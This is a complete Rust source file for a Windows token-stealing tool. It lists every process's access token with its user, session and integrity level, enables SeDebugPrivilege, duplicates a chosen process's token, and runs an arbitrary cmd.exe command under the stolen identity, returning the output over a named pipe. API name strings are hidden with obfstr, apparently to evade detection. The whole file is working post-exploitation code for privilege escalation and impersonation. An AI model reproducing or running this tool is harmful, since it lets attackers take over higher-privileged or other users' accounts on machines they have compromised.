use core::time;
use std::thread;
use std::{io::Error, mem::size_of, slice};
use std::ffi::{c_void, c_ulong};
use clap::Parser;
use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, FALSE, STILL_ACTIVE};
use windows_sys::Win32::Storage::FileSystem::{PIPE_ACCESS_DUPLEX, ReadFile};
use windows_sys::Win32::System::Memory::LocalAlloc;
use windows_sys::core::PCSTR;
use std::ptr::null_mut;
use obfstr::obfstr;
use windows_sys::Win32::System::Pipes::{CreateNamedPipeA, PIPE_TYPE_MESSAGE, ConnectNamedPipe};
use windows_sys::{Win32::{Foundation::{HANDLE, CloseHandle}, Security::{SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, LookupPrivilegeValueW, AdjustTokenPrivileges, TOKEN_PRIVILEGES, DuplicateTokenEx, SecurityImpersonation, TokenPrimary, GetTokenInformation, TokenUser, TokenStatistics, TOKEN_USER, TOKEN_QUERY, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, LookupAccountSidW, SID_NAME_USE, TokenSessionId, TOKEN_STATISTICS, TokenImpersonation, TokenIntegrityLevel, GetSidSubAuthority, TOKEN_MANDATORY_LABEL, GetSidSubAuthorityCount, TokenImpersonationLevel, SECURITY_IMPERSONATION_LEVEL, SecurityDelegation, SecurityAnonymous, SecurityIdentification, TOKEN_TYPE}}, core::PWSTR};
use windows_sys::Win32::System::{Threading::{PROCESS_QUERY_INFORMATION, CreateProcessWithTokenW, STARTUPINFOW, PROCESS_INFORMATION}, SystemServices::{SE_DEBUG_NAME, SE_ASSIGNPRIMARYTOKEN_NAME, MAXIMUM_ALLOWED, SECURITY_MANDATORY_LOW_RID, SECURITY_MANDATORY_MEDIUM_PLUS_RID, SECURITY_MANDATORY_MEDIUM_RID, SECURITY_MANDATORY_HIGH_RID, SECURITY_MANDATORY_SYSTEM_RID, SECURITY_MANDATORY_UNTRUSTED_RID, SECURITY_MANDATORY_PROTECTED_PROCESS_RID}, Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next}};
use windows_sys::Win32::System::Threading::{OpenProcess, OpenProcessToken, GetCurrentProcess, GetExitCodeProcess};

struct Token {
    handle: HANDLE,
    process_id: u32,
    process_name: String,
    session_id: u32,
    username: String,
    token_type: TOKEN_TYPE,
    token_impersonation: ImpersonationLevel,
    token_integrity: IntegrityLevel,
}

const FIXED_SECURITY_MANDATORY_MEDIUM_PLUS_RID: i32 = SECURITY_MANDATORY_MEDIUM_PLUS_RID as i32;

#[repr(i32)]
pub enum IntegrityLevel {
    Untrusted = SECURITY_MANDATORY_UNTRUSTED_RID,
    Low = SECURITY_MANDATORY_LOW_RID,
    Medium = SECURITY_MANDATORY_MEDIUM_RID,
    MediumPlus = FIXED_SECURITY_MANDATORY_MEDIUM_PLUS_RID,
    High = SECURITY_MANDATORY_HIGH_RID,
    System = SECURITY_MANDATORY_SYSTEM_RID,
    ProtectedProcess = SECURITY_MANDATORY_PROTECTED_PROCESS_RID,
}

impl IntegrityLevel {
    pub fn display_str(&self) -> &'static str {
        match self {
            IntegrityLevel::Untrusted => "Untrusted",
            IntegrityLevel::Low => "Low",
            IntegrityLevel::Medium => "Medium",
            IntegrityLevel::MediumPlus => "MediumPlus",
            IntegrityLevel::High => "High",
            IntegrityLevel::System => "System",
            IntegrityLevel::ProtectedProcess => "ProtectedProcess",
        }
    }
}

#[repr(i32)]
pub enum ImpersonationLevel {
    Impersonation = SecurityImpersonation,
    Delegation = SecurityDelegation,
    Anonymous = SecurityAnonymous,
    Identification = SecurityIdentification,
}

impl ImpersonationLevel {
    pub fn display_str(&self) -> &'static str {
        match self {
            ImpersonationLevel::Impersonation => "Impersonation",
            ImpersonationLevel::Delegation => "Delegation",
            ImpersonationLevel::Anonymous => "Anonymous",
            ImpersonationLevel::Identification => "Identification",
        }
    }
}

impl std::fmt::Display for Token{
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        if self.token_type == TokenPrimary {
            write!(f, "[{}]\t[PROCESS: {}][SESSION: {}][TYPE: Primary][{}] User: {}", self.process_name,  self.process_id, self.session_id, self.token_integrity.display_str(), self.username)
        } else {
            write!(f, "[{}]\t[PROCESS: {}][SESSION: {}][TYPE: Impersonation][{}] User: {}", self.process_name, self.process_id, self.session_id, self.token_impersonation.display_str(), self.username)
        }   
    }
}

enum Mode {
    Exec,
    List,
}

impl std::str::FromStr for Mode {
    type Err = Error;

    fn from_str(s: &str)-> Result<Self,Self::Err>{
        match s.to_ascii_lowercase().as_str() {
            "list" => Ok(Mode::List),
            "exec" => Ok(Mode::Exec),
            _ => Ok(Mode::List),
        }
    }
}

#[derive(Parser)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(required = true, help = "list or exec")]
    mode: String,

    #[arg(long, required = false, help = "pid to impersonate")]
    pid: Option<u32>,

    #[arg(long, required = false, help = "command to execute")]
    command: Option<String>,
}

fn main() {
    let args = Args::parse();
    let mode = args.mode.parse::<Mode>().expect("Wrong mode");
    
    se_priv_enable().expect("Failed to enable privileges");

    match mode {
        Mode::List => enum_token().expect("Failed to enum tokens"),
        Mode::Exec => {
            let pid = args.pid.expect("Please enter a pid to steal the token from");
            let command = args.command.expect("Please enter a command to execute");
            impersonate(pid, command).expect("Failed to impersonate")
        },
    };

}

fn enum_token() -> Result<bool, String>{
    unsafe {
        let hsnapshot =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        let mut lppe: PROCESSENTRY32 = std::mem::zeroed::<PROCESSENTRY32>();
        lppe.dwSize = size_of::<PROCESSENTRY32> as u32;

        if Process32First(hsnapshot, &mut lppe) != 0 {
            loop {
                if Process32Next(hsnapshot, &mut lppe) == 0 {
                    // No more process in list
                    return Ok(true);
                };

                // Check if process is in blacklist
                // let blacklist = vec!["lsass.exe","winlogon.exe","svchost.exe"];
                // if blacklist.iter().any(|&i| i == array_to_string(lppe.szExeFile)){
                //     // println!("Process in blacklist, continue...");
                //     continue
                // }
                let process_name = array_to_string(lppe.szExeFile);

                let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, lppe.th32ProcessID);
                if process_handle == INVALID_HANDLE_VALUE || process_handle == 0 {
                    CloseHandle(process_handle);
                    continue;
                }

                let mut token_handle: HANDLE = std::mem::zeroed();
                if OpenProcessToken(process_handle as HANDLE,  TOKEN_QUERY, &mut token_handle) == 0 {
                    CloseHandle(process_handle);
                    CloseHandle(token_handle);
                    continue;
                };
                let mut token = Token {
                    handle: token_handle,
                    username: "".to_owned(),
                    process_id: lppe.th32ProcessID,
                    process_name: process_name.to_owned(),
                    session_id: 0,
                    token_impersonation: ImpersonationLevel::Anonymous,
                    token_integrity: IntegrityLevel::Untrusted,
                    token_type: 0,
                };

                if let Ok(_) = get_token_user_info(&mut token){
                    if let Ok(_) = get_token_session_id(&mut token){
                        if let Ok(_) = get_token_information(&mut token){
                            println!("{token}")
                        }
                    } else {
                        CloseHandle(process_handle);
                        CloseHandle(token_handle);
                    // Handle error
                    }
                } else {
                    CloseHandle(process_handle);
                    CloseHandle(token_handle);
                    // Handle error
                }
                CloseHandle(process_handle);
                CloseHandle(token_handle);
            }
        } else {
            return Err("Error when calling Process32Next".to_owned());
        }
    }
}

fn get_token_session_id(token: *mut Token) -> Result<bool, String> {
    unsafe {
        let mut size: u32 = 0;
        GetTokenInformation((*token).handle, TokenSessionId,null_mut() , size , &mut size);
        let buffer = LocalAlloc(0, size as usize);
        if GetTokenInformation((*token).handle, TokenSessionId,buffer as *mut c_void, size, &mut size) == 0 {
            return Err(format!("{} Error: {}",obfstr!("GetTokenInformation"), Error::last_os_error()).to_owned());
        };
        let session_id = std::ptr::read(buffer as *const c_ulong);
        (*token).session_id = session_id as u32;
        return Ok(true);
    }
}

fn get_token_user_info(token: *mut Token) -> Result<bool, String>{
    unsafe {
        let mut size: u32 = 0;
        GetTokenInformation((*token).handle, TokenUser,null_mut() , size , &mut size);
        let buffer = LocalAlloc(0, size as usize);
        if GetTokenInformation((*token).handle, TokenUser,buffer as *mut c_void, size, &mut size) == 0 {
            return Err(format!("{} Error: {}",obfstr!("GetTokenInformation"), Error::last_os_error()).to_owned());
        };

        let token_user_info: TOKEN_USER = std::ptr::read(buffer as *const TOKEN_USER);
        let mut name_buffer = Vec::<u16>::with_capacity(256);
        let name: PWSTR = name_buffer.as_mut_ptr();
        let mut cchname: u32 = 256;

        let mut refdomain_buffer = Vec::<u16>::with_capacity(256);
        let referenceddomainname: PWSTR = refdomain_buffer.as_mut_ptr();
        let mut cchreferenceddomainname: u32 = 256;

        let mut sid = SID_NAME_USE::default();
        if LookupAccountSidW(null_mut(), token_user_info.User.Sid, name, &mut cchname, referenceddomainname, &mut cchreferenceddomainname, &mut sid) == 0 {
            return Err(format!("{} Error: {}",obfstr!("LookupAccountSidW"), Error::last_os_error()).to_owned());
        }
        let username = pwstr_to_string(name);
        let domain = pwstr_to_string(referenceddomainname);
        (*token).username = domain + "\\" + &username;
        return Ok(true);
    }
}

#[allow(non_upper_case_globals)]
fn get_token_information(token: *mut Token) -> Result<bool,String>{
    unsafe {
        let mut size: u32 = 0;
        GetTokenInformation((*token).handle, TokenStatistics,null_mut() , size , &mut size);
        let buffer = LocalAlloc(0, size as usize);
        if GetTokenInformation((*token).handle, TokenStatistics,buffer as *mut c_void, size, &mut size) == 0 {
            return Err(format!("{} Error: {}",obfstr!("GetTokenInformation"), Error::last_os_error()).to_owned());
        };
        let token_stat_info: TOKEN_STATISTICS = std::ptr::read(buffer as *const TOKEN_STATISTICS);
        (*token).token_type = token_stat_info.TokenType;
        if (*token).token_type == TokenPrimary {
            let mut primary_size: u32 = 0;
            GetTokenInformation((*token).handle, TokenIntegrityLevel,null_mut() , primary_size , &mut primary_size);
            let buffer = LocalAlloc(0, size as usize);
            if GetTokenInformation((*token).handle, TokenIntegrityLevel,buffer as *mut c_void, size, &mut size) == 0 {
                return Err(format!("{} Error: {}",obfstr!("GetTokenInformation"), Error::last_os_error()).to_owned());
            };
            let token_mandatory_label: TOKEN_MANDATORY_LABEL = std::ptr::read(buffer as *const TOKEN_MANDATORY_LABEL);
            let integrity_level = *GetSidSubAuthority(token_mandatory_label.Label.Sid, (*GetSidSubAuthorityCount(token_mandatory_label.Label.Sid)) as u32 -1) as i32;
            (*token).token_integrity = match integrity_level {
                SECURITY_MANDATORY_UNTRUSTED_RID => IntegrityLevel::Untrusted,
                SECURITY_MANDATORY_LOW_RID => IntegrityLevel::Low,
                SECURITY_MANDATORY_MEDIUM_RID => IntegrityLevel::Medium,
                FIXED_SECURITY_MANDATORY_MEDIUM_PLUS_RID => IntegrityLevel::MediumPlus,
                SECURITY_MANDATORY_HIGH_RID => IntegrityLevel::High,
                SECURITY_MANDATORY_SYSTEM_RID => IntegrityLevel::System,
                SECURITY_MANDATORY_PROTECTED_PROCESS_RID => IntegrityLevel::ProtectedProcess,
                _ => IntegrityLevel::Untrusted,
            };
        } else if (*token).token_type == TokenImpersonation {
            let mut impersonate_size: u32 = 0;
            GetTokenInformation((*token).handle, TokenImpersonationLevel,null_mut() , impersonate_size , &mut impersonate_size);
            let buffer = LocalAlloc(0, size as usize);
            if GetTokenInformation((*token).handle, TokenImpersonationLevel,buffer as *mut c_void, size, &mut size) == 0 {
                return Err(format!("{} Error: {}",obfstr!("GetTokenInformation"), Error::last_os_error()).to_owned());
            };
            let security_impersonation_level: SECURITY_IMPERSONATION_LEVEL = std::ptr::read(buffer as *const SECURITY_IMPERSONATION_LEVEL);
            (*token).token_impersonation = match security_impersonation_level {
                SecurityImpersonation => ImpersonationLevel::Impersonation,
                SecurityAnonymous => ImpersonationLevel::Anonymous,
                SecurityDelegation => ImpersonationLevel::Delegation,
                SecurityIdentification => ImpersonationLevel::Identification,
                _ => ImpersonationLevel::Anonymous,
            };
        }   
    }
    Ok(true)
}

fn impersonate(pid: u32, command: String) -> Result<bool, String> {
    unsafe {
        let mut token_handle: HANDLE = std::mem::zeroed();
        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if process_handle == INVALID_HANDLE_VALUE || process_handle == 0 {
            CloseHandle(process_handle);
            return Err(format!("{} Error: {}",obfstr!("OpenProcess"), Error::last_os_error()).to_owned());
        }
        if OpenProcessToken(process_handle,  TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &mut token_handle) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
        };

        let mut duplicate_token_handle: HANDLE = std::mem::zeroed();
        if DuplicateTokenEx(token_handle, MAXIMUM_ALLOWED, null_mut(), SecurityImpersonation, TokenPrimary, &mut duplicate_token_handle) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("DuplicateTokenEx"), Error::last_os_error()).to_owned());
        };

        // spawn NamedPipe
        let pipe_name: PCSTR = "\\\\.\\pipe\\waza\0".as_ptr() as *const u8 as PCSTR;
        let server_pipe =  CreateNamedPipeA(pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 16384, 16384,0,null_mut());

        let si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let mut cmd = (format!("cmd.exe /c \"{}\" > \\\\.\\pipe\\waza",command).to_owned() + "\0").encode_utf16().collect::<Vec<u16>>();
        if CreateProcessWithTokenW(duplicate_token_handle, 0, null_mut(), cmd.as_mut_ptr() as *mut _ as PWSTR, 0,FALSE as *const c_void,FALSE as *const u16,&si , &mut pi) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("CreateProcessWithTokenW"), Error::last_os_error()).to_owned());
        }

        // Read command line return
        let mut bytes_read:u32 = 0;
        let mut buffer_read = vec![0u8;16384];
        if ConnectNamedPipe(server_pipe, null_mut()) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("ConnectNamedPipe"), Error::last_os_error()).to_owned());
        }

        // Waiting for process to finish
        loop {
            let mut exit_code = 0u32;
            GetExitCodeProcess(pi.hProcess, &mut exit_code);
            if exit_code as i32 != STILL_ACTIVE {
                break;
            }
            thread::sleep(time::Duration::from_millis(500));
        }

        if ReadFile(server_pipe, buffer_read.as_mut_ptr() as *mut c_void, buffer_read.len() as u32, &mut bytes_read, null_mut())  == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("ReadFile"), Error::last_os_error()).to_owned());
        }
        println!("{} bytes read:",bytes_read);
        println!("{}",String::from_utf8_lossy(&mut buffer_read[..(bytes_read as usize)]));

        CloseHandle(process_handle);
        CloseHandle(token_handle);
        CloseHandle(duplicate_token_handle);

        return Ok(true)
    }   
}

fn se_priv_enable() -> Result<bool, String>{
    unsafe {
        // Enable SeDebugPrivilege
        let mut token_handle:HANDLE = std::mem::zeroed();

        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();
        privilege.PrivilegeCount = 1;
        privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token_handle) == 0 {
            return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
        };

        if LookupPrivilegeValueW(null_mut(), SE_DEBUG_NAME, &mut privilege.Privileges[0].Luid) == 0 {
            return Err(format!("{} Error: {}",obfstr!("LookupPrivilegeValueW"), Error::last_os_error()).to_owned());
        }

        if AdjustTokenPrivileges(token_handle as HANDLE, 0, &mut privilege, std::mem::size_of_val(&privilege) as u32, null_mut(), null_mut()) == 0 {
            return Err(format!("{} Error: {}",obfstr!("AdjustTokenPrivileges"), Error::last_os_error()).to_owned());
        }

        if CloseHandle(token_handle as HANDLE) == 0 {
            return Err(format!("{} Error: {}",obfstr!("CloseHandle"), Error::last_os_error()).to_owned());
        }

        // Enable SeAssignPrimaryToken
        let mut token_handle:HANDLE = std::mem::zeroed();

        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();
        privilege.PrivilegeCount = 1;
        privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token_handle) == 0 {
            return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
        };

        if LookupPrivilegeValueW(null_mut(), SE_ASSIGNPRIMARYTOKEN_NAME, &mut privilege.Privileges[0].Luid) == 0 {
            return Err(format!("{} Error: {}",obfstr!("LookupPrivilegeValueW"), Error::last_os_error()).to_owned());
        }

        if AdjustTokenPrivileges(token_handle as HANDLE, 0, &mut privilege, std::mem::size_of_val(&privilege) as u32, null_mut(), null_mut()) == 0 {
            return Err(format!("{} Error: {}",obfstr!("AdjustTokenPrivileges"), Error::last_os_error()).to_owned());
        }

        if CloseHandle(token_handle as HANDLE) == 0 {
            return Err(format!("{} Error: {}",obfstr!("CloseHandle"), Error::last_os_error()).to_owned());
        }
        return Ok(true);
    }
}

fn pwstr_to_string(buffer: PWSTR) -> String{
    let transate  = unsafe {slice::from_raw_parts(buffer, 256)};
    return array_to_string_utf16( transate);
}

fn array_to_string_utf16(buffer: &[u16]) -> String {
    let mut string: Vec<u16> = Vec::new();
    for char in buffer.to_vec() {
        if char == 0 {
            break;
        }
        string.push(char);
    }
    String::from_utf16(&string).unwrap()
}

fn array_to_string(buffer: [u8; 260]) -> String {
    let mut string: Vec<u8> = Vec::new();
    for char in buffer.to_vec() {
        if char == 0 {
            break;
        }
        string.push(char);
    }
    String::from_utf8(string).unwrap()
}